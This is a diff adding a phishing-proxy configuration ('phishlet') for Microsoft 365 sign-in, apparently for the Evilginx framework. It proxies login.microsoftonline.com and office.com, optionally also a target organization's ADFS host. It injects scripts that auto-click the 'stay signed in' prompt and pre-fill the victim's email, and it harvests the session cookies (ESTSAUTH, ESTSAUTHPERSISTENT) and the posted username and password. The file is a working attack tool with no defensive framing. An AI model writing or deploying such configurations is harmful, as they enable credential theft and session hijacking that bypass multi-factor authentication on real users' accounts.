@@ -1,0 +1,101 @@
+name: 'o365'
+author: '@jamescullum'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  # The lines below are needed if your target organization utilizes ADFS.
+  # If they do, you need to uncomment all following lines that contain <...>
+  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
+  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
+  #    <insert-adfs-subdomain> = adfs
+  #    <insert-adfs-host> = example.com
+  #    <insert-adfs-subdomain-and-host> = adfs.example.com
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], with_params: ['email']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true, with_params: ['email']}
+  # Uncomment and fill in if your target organization utilizes ADFS
+  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/login"]
+    script: |
+      function autoBtnClick(){
+        console.log("trying autoclick");
+      if(document.getElementById("KmsiCheckboxField") != null){
+        console.log("now clicking button ")
+        setTimeout(function(){
+        document.getElementById("idSIButton9").click();
+        console.log("button clicked ");
+        }, 1000);
+      }
+      else{
+       console.log("error auto click trying again");
+      setTimeout(function(){autoBtnClick();}, 1000);
+      }
+      }
+      setTimeout(function(){autoBtnClick();}, 1000);
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/"]
+    script: |
+      var aemail = "";
+      const cat = localStorage.getItem('email');
+      if(cat){
+        aemail = cat;
+      }else{
+        console.log("no cat")
+      }
+
+      
+
+      console.log(aemail)
+    
+      
+
+      function lp(){
+        try{
+            console.log("click form...");
+            document.getElementById("i0116").click()
+            console.log("started...");
+            document.getElementById("i0116").value = aemail;
+            if(document.getElementById("i0116").value != ""){
+              console.log("not null");
+              
+             // document.getElementById("idSIButton9").click()
+            }else{
+              console.log("null and not clicked");
+            }
+            //setTimeout(function(){;},1000)  
+          //  console.log("yes now click")
+          //  setTimeout(function(){document.getElementById("idSIButton9").click();document.getElementById("idSIButton9").click();document.getElementById("idSIButton9").click()},5000)
+          //  console.log("clicked")
+            
+        }
+        catch(err){
+          setTimeout(function(){lp();}, 1000);
+        }
+      }
+      setTimeout(function(){lp();}, 1000);
+      
+
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
